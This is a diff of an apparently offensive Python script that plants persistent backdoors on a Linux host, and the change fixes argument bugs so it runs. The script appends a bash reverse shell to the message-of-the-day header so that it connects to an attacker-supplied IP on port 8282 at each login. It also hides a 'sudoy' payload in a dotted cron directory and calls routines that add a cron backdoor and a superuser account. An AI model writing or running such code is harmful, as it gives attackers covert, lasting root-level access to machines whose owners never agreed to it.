@@ -16,15 +16,15 @@ def backDoorBashRC():
 
 	subprocess.run('mv ./payloads/sudoy /etc/default/.cron.d/sudoy')
 
-def backDoorMessageOfTheDay(ip, port):
+def backDoorMessageOfTheDay(ip):
 	with open('/etc/update-motd.d/00-header', 'a') as headerFile:
 		headerFile.write(f'bash -c "bash -i >& /dev/tcp/{ip}/8282 0>&1"') #update the ip and port accordingly
 
 def main():
 	attackBoxIP = sys.argv[1] #first command line argument is the ip of teh box you want to set the reverse shells to connect back to
-	backDoorMessageOfTheDay(ip)
+	backDoorMessageOfTheDay(attackBoxIP)
 	backDoorBashRC()
-	createCronTabBackDoor(ip)
+	createCronTabBackDoor(attackBoxIP)
 	createSuperUser()
 
 if __name__ == '__main__':
